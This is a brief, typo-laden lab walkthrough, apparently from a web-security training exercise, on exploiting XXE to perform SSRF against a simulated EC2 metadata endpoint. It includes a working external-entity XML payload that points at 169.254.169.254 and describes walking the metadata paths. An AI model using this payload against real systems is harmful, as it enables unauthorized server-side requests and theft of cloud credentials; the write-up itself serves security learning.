Exploiting XXE to perform SSRF attacks:

    -This attack perfrom under Server-Side Request Forgery(SSRF)
    -Burp suite to be used
    -The lab server is running a (simulated) EC2 metadata endpoint at the default URL http://169.254.169.254/ By this url we caan retrive data one by one 
    -We send the request of the Check stock to repeter and We change the XML part
    -< !DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/">]>
     <productId>&xxe;</productId>
    -By sending this we get "Invalid ProductId : latest"
    -http://169.254.169.254/latest --> we change this insted of that one and by sending this we get another response and upto JSON part of the XML